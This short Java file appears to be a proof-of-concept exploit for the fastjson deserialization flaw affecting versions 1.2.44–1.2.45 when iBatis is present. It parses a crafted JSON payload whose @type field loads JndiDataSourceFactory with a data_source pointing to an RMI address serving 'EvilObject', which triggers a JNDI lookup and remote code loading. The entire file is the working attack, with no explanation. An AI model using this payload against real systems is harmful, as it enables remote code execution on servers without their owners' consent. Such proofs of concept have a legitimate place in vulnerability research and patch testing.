import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;

//@dependency{fastjson:1.2.44-1.2.45,ibatis}
public class jndiDataSourcefactory {
    public static void main(String args[]) {
        String payload = "{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://127.0.0.1:1099/EvilObject\"}}";
        Object res = JSON.parse(payload, Feature.SupportNonPublicField);

    }
}
